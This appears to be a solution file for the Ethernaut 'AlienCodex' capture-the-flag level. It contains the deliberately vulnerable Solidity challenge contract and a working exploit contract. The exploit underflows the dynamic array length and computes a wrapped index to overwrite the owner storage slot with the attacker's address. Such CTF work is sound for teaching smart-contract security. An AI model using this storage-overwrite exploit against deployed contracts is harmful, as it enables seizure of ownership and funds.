// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "hardhat/console.sol";

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner(), "owner incorrect");
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "can not transfer to null");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

// Thoughts
// 1. Make contact
// 2. Overflow and overwrite the owner slot
// 3. Done

contract AlienCodexSolution {
    constructor(address _challengeAddress) public {
        AlienCodex challenge = AlienCodex(_challengeAddress);

        // Unlock the function calls
        challenge.make_contact();

        // Underflow the length such that direct access is enabled
        challenge.retract();
        require(challenge.contact(), "Not contacted");

        // Max uint256 - zero-th element position + 1
        uint256 positionToOverflow = uint256(uint256(2**256 - 1) - uint256(keccak256(abi.encode(uint256(1))))) + uint256(1);

        // Since bytes are encoded big-endian, we cast to int and up-constant
        // such that 0 padding is to the left instead of right
        challenge.revise(positionToOverflow, bytes32(uint256(uint160(bytes20(tx.origin)))));
        require(challenge.owner() == tx.origin, "Address not set");
    }
}